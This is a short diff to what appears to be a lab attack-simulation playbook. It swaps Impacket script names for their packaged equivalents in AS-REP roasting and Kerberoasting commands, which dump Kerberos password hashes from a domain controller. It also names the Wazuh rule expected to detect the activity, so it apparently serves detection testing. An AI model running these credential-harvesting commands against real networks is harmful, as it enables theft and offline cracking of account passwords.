@@ -15,7 +15,7 @@ No credentials needed. Target accounts with Kerberos pre-authentication disabled
 
 ```bash
 # Use BadBlood user list from DC1
-GetNPUsers.py {{domain}}/ -dc-ip {{dc}} -no-pass \
+impacket-GetNPUsers {{domain}}/ -dc-ip {{dc}} -no-pass \
   -usersfile /tmp/all_users.txt \
   -outputfile {{logDir}}/asrep_hashes.txt 2>&1
 ```
@@ -33,13 +33,13 @@ Enumerate service accounts with SPNs and request TGS tickets.
 
 ```bash
 # If we have domain creds, use them
-GetUserSPNs.py {{domain}}/{{domain_user}}:{{domain_pass}} \
+impacket-GetUserSPNs {{domain}}/{{domain_user}}:{{domain_pass}} \
   -dc-ip {{dc}} \
   -outputfile {{logDir}}/kerberoast_hashes.txt \
   -request 2>&1
 
 # Without creds (anonymous, if allowed):
-GetUserSPNs.py {{domain}}/ -dc-ip {{dc}} -no-pass 2>&1
+impacket-GetUserSPNs {{domain}}/ -dc-ip {{dc}} -no-pass 2>&1
 ```
 
 Expected Wazuh rule: **100111** (level 12) -- Kerberoasting
